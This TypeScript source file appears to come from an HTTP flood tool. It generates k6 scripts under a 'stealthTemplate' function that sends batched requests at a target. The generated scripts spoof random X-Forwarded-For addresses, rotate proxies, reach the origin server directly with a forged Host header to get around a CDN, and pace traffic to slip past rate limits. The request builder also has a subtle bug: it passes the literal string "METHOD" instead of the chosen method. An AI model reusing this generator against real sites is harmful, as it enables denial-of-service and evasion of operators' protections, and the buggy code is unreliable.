import type { AttackOptions } from "../runner.js";
import { sanitizeForScript } from "../../utils/sanitizer.js";
import { generateStealthHelpersScript } from "./utils/stealth.js";
import { parseDuration } from "../../utils/validator.js";

function buildThresholds(opts: AttackOptions): string {
	if (!opts.thresholds || opts.thresholds.length === 0) return "";
	const grouped: Record<string, string[]> = {};
	for (const t of opts.thresholds) {
		const colonIndex = t.indexOf(":");
		if (colonIndex === -1) continue;
		const metric = t.slice(0, colonIndex);
		const condition = t.slice(colonIndex + 1);
		if (!grouped[metric]) grouped[metric] = [];
		grouped[metric].push(condition);
	}
	const lines = Object.entries(grouped).map(([metric, conditions]) => {
		const conditionsStr = conditions.map((c) => JSON.stringify(c)).join(", ");
		return `    "${metric}": [${conditionsStr}]`;
	});
	return `,\n  thresholds: {\n${lines.join(",\n")}\n  }`;
}

function extractHost(target: string): string {
	const match = target.match(/^https?:\/\/([^/]+)/);
	return match ? match[1] : target;
}

function buildOriginTarget(target: string, origin: string): string {
	return target.replace(/^https?:\/\/[^/]+/, `http://${origin}`);
}

function buildStealthStages(
	vus: number,
	durationStr: string,
): Array<{ duration: string; target: number }> {
	const totalSeconds = parseDuration(durationStr);

	if (totalSeconds <= 0) {
		return [
			{ duration: "30s", target: Math.floor(vus * 0.3) },
			{ duration: "1m", target: Math.floor(vus * 0.7) },
			{ duration: "2m", target: vus },
			{ duration: "30s", target: Math.floor(vus * 0.5) },
			{ duration: "1m", target: vus },
			{ duration: "30s", target: 0 },
		];
	}

	function fmt(seconds: number): string {
		if (seconds >= 60 && seconds % 60 === 0)
			return `${Math.round(seconds / 60)}m`;
		return `${Math.round(seconds)}s`;
	}

	return [
		{ duration: fmt(totalSeconds * 0.1), target: Math.floor(vus * 0.3) },
		{ duration: fmt(totalSeconds * 0.15), target: Math.floor(vus * 0.7) },
		{ duration: fmt(totalSeconds * 0.3), target: vus },
		{ duration: fmt(totalSeconds * 0.1), target: Math.floor(vus * 0.5) },
		{ duration: fmt(totalSeconds * 0.25), target: vus },
		{ duration: fmt(totalSeconds * 0.1), target: 0 },
	];
}

export function stealthTemplate(opts: AttackOptions): string {
	const headersStr = Object.entries(opts.headers)
		.map(([k, v]) => `${sanitizeForScript(k)}: ${sanitizeForScript(v)}`)
		.join(", ");

	const batchSize = Math.min(Math.max(opts.rpsPerVu, 1), 20);

	const hasProxyList = opts.proxyList.length > 0;
	const hasOrigin = opts.origin.length > 0;
	const hostname = extractHost(opts.target);
	const actualTarget = hasOrigin
		? sanitizeForScript(buildOriginTarget(opts.target, opts.origin))
		: sanitizeForScript(opts.target);

	const checkBlock = opts.noCheck
		? ""
		: `  for (const res of responses) {
      if (res.status !== 429) {
        check(res, {
          "status was 200": (r) => r.status === 200,
        });
      }
    }`;

	const stages = buildStealthStages(opts.vus, opts.duration);

	const iterationsBlock =
		opts.iterations > 0 ? `,\n  iterations: ${opts.iterations},` : "";

	const xffScript = `
function randomIP() {
  const ranges = [[1, 126], [128, 191], [192, 223]];
  const range = ranges[Math.floor(Math.random() * ranges.length)];
  const a = Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0];
  const b = Math.floor(Math.random() * 256);
  const c = Math.floor(Math.random() * 256);
  const d = Math.floor(Math.random() * 254) + 1;
  return a + "." + b + "." + c + "." + d;
}

function spoofIPHeaders() {
  return {
    "X-Forwarded-For": randomIP(),
  };
}
`;

	const proxyRotationScript = hasProxyList
		? `
const PROXY_LIST = JSON.parse(__ENV.PROXY_LIST || "[]");

function randomProxy() {
  if (PROXY_LIST.length === 0) return undefined;
  return PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
}
`
		: "";

	const hostHeader = hasOrigin
		? `"Host": ${sanitizeForScript(hostname)}, `
		: "";

	const defaultHeaders = `${hostHeader}${headersStr || `${sanitizeForScript("User-Agent")}: ${sanitizeForScript("oura/1.0")}`}`;

	const proxyParam = hasProxyList
		? `    const proxyUrl = randomProxy();\n`
		: "";
	const proxyObj = hasProxyList
		? `, ...(proxyUrl ? { proxy: proxyUrl } : {})`
		: "";

	const buildRequestParams = (headerExpr: string) =>
		`{ headers: ${headerExpr}, timeout: "10s"${proxyObj} }`;

	return `import http from "k6/http";
import { check, sleep } from "k6";

export const options = {
  stages: ${JSON.stringify(stages, null, 2)},${iterationsBlock}${buildThresholds(opts)}
};

${generateStealthHelpersScript()}
${xffScript}${proxyRotationScript}
const BASE_HEADERS = { ${defaultHeaders} };
const TARGET = ${actualTarget};
const METHOD = ${sanitizeForScript(opts.method.toLowerCase())};
const PAYLOAD = ${opts.payload ? sanitizeForScript(opts.payload) : "null"};
const BATCH_SIZE = ${batchSize};

export default function () {
  const stealthHeaders = generateStealthHeaders();
  const mergedHeaders = Object.assign({}, BASE_HEADERS, stealthHeaders, spoofIPHeaders());
${proxyParam}
  const params = ${buildRequestParams("mergedHeaders")};

  const requests = [];
  for (let i = 0; i < BATCH_SIZE; i++) {
    if (PAYLOAD) {
      requests.push(["METHOD", TARGET, PAYLOAD, params]);
    } else {
      requests.push(["METHOD", TARGET, params]);
    }
  }

  const responses = http.batch(requests);
  ${checkBlock}

  let has429 = false;
  for (const res of responses) {
    if (res && res.status === 429) {
      has429 = true;
      break;
    }
  }
  if (has429) {
    handleBackoff({ status: 429 });
  }

  stealthSleep();
}
`;
}
